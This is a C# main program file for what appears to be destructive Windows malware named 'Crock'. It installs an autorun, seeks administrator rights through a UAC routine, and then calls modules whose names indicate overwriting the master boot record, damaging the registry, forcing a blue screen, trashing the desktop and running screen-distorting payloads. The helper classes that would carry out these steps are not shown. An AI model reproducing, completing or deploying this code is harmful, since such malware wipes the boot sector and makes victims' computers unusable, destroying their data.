﻿using System.Threading;
using System.Security.Principal;

namespace Crock
{
    class Program
    {
        // Запус всех модулей
        public static void UseExp()
        {
            Protect.Block();
            Killer.MBR();
            Addition.RegFun();
            var rule = new Rules();
            new Thread(() => rule.ShowDialog()).Start();
            new Thread(() => Addition.TrashDestop()).Start();
            new Thread(() => Effect.GDI_payloads()).Start();
            Killer.RegFuck();
            Killer.BSOD();
        }

        private static void Main()
        {
            if (!Addition.IsInstalledAR())
                Addition.InstallAR();

            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (isElevated)
            {
                UseExp();
            }
            else
            {
                Addition.UAC();
            }
        }
    }
}
